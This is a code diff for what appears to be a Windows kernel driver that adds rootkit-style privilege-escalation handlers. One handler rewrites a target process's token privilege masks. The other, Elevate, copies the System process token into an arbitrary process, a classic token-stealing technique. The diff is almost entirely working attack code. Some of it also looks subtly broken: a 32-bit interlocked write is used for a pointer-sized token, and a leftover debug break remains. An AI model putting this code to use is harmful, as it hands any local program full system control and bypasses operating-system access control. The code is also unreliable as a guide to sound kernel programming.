@@ -2,7 +2,7 @@
 #include "utils.h"
 #include "offsets.h"
 #include "sync.h"
-#include<ntstrsafe.h>
+#include <ntstrsafe.h>
 #include <ntstatus.h>
 #include <ntddk.h>
 
@@ -38,6 +38,84 @@ NTSTATUS IoctlHandlers::HandleElevate(PIRP pIrp) {
 	pIrp->IoStatus.Status = status;
 
 	return status;
+}
+
+NTSTATUS IoctlHandlers::AddPrivsToProcess(PIRP pIrp) {
+
+	NTSTATUS status = STATUS_SUCCESS;
+
+	PTEMP_VARS temp_vars = static_cast<PTEMP_VARS>(pIrp->AssociatedIrp.SystemBuffer);
+
+	DbgPrintEx(0, 0, "Recived IOCTL to add privleges...\n");
+
+	PKDPC pkdpc = Sync::GainAllThreadExclusive();
+	
+	PEPROCESS eproc = Utilities::FindProcEproc(temp_vars->pid);
+
+	if (!eproc) {
+		DbgPrintEx(0, 0, "Error: Could not find process with PID...\n");
+		status = STATUS_INVALID_PARAMETER;
+		pIrp->IoStatus.Information = 0;
+		Sync::ReleaseAllThreadExclusive(pkdpc);
+		return status;
+	}
+
+	DbgPrintEx(0, 0, "Found EPROC struct...\n");
+
+	ULONG_PTR token = Utilities::GetProcessToken(eproc);
+
+	if (!token) {
+		DbgPrintEx(0, 0, "Error: Could not find token...\n");
+		status = STATUS_INVALID_PARAMETER;
+		pIrp->IoStatus.Information = 0;
+		Sync::ReleaseAllThreadExclusive(pkdpc);
+		return status;
+	}
+
+	DbgPrintEx(0, 0, "Found token...\n");
+
+
+	PSEP_TOKEN_PRIVILEGES sep = Utilities::GetTokenSEP(token);
+
+
+	if (!sep) {
+		DbgPrintEx(0, 0, "Error: Could not find SEP struct...\n");
+		status = STATUS_INVALID_PARAMETER;
+		pIrp->IoStatus.Information = 0;
+		Sync::ReleaseAllThreadExclusive(pkdpc);
+		return status;
+	}
+
+	DbgPrintEx(0, 0, "Found _SEP_TOKEN_PRIVILEGES...\n");
+
+	PVARS vars = Utilities::GetVars(temp_vars, sep->Present, sep->Enabled, sep->EnabledByDefault);
+
+	if (!vars) {
+		DbgPrintEx(0, 0, "Error: Could not allocate memory for vars...\n");
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		pIrp->IoStatus.Information = 0;
+		Sync::ReleaseAllThreadExclusive(pkdpc);
+		return status;
+	} 
+
+	__debugbreak();
+
+	sep->Present = vars->Present_Mask;
+	sep->Enabled = vars->Enabled_Mask;
+	sep->EnabledByDefault = vars->EnabledByDefault_Mask;
+	
+
+	ExFreePool(vars);
+
+	Sync::ReleaseAllThreadExclusive(pkdpc);
+
+	DbgPrintEx(0, 0, "Added the privileges...\n");
+
+	pIrp->IoStatus.Information = 0;
+	pIrp->IoStatus.Status = status;
+
+	return status;
+
 }
 
 //
@@ -176,9 +254,39 @@ NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret) {
 
 NTSTATUS Elevate(ULONG pid) {
 
-	UNREFERENCED_PARAMETER(pid);
-	KdPrint(("TODO!!\n"));
-	return STATUS_SUCCESS;
+	NTSTATUS status = STATUS_SUCCESS;
+
+	PEPROCESS eproc;
+	PEPROCESS SystemProcess;
+
+	ULONG SystemPID = 4;
+
+	eproc = Utilities::FindProcEproc(pid);
+
+	if (!eproc) {
+		DbgPrintEx(0, 0, "Error: Could not find process with PID...\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	SystemProcess = Utilities::FindProcEproc(SystemPID);
+
+	if (!SystemProcess) {
+		DbgPrintEx(0, 0, "Error: Could not find System Process...\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	EX_FAST_REF* ref = reinterpret_cast<EX_FAST_REF*>((PUCHAR)SystemProcess + TOKENOFFSET );
+
+	DbgPrintEx(0, 0, "Found System Process token proceeding to swap tokens...\n");
+
+	InterlockedExchange(reinterpret_cast<PLONG>((PUCHAR)(eproc) + TOKENOFFSET), ref->Value);
+
+	ObDereferenceObject(SystemProcess);
+	ObDereferenceObject(eproc);
+
+	DbgPrintEx(0, 0, "Sucessfully elevated process...\n");
+
+	return status;
 
 }
 
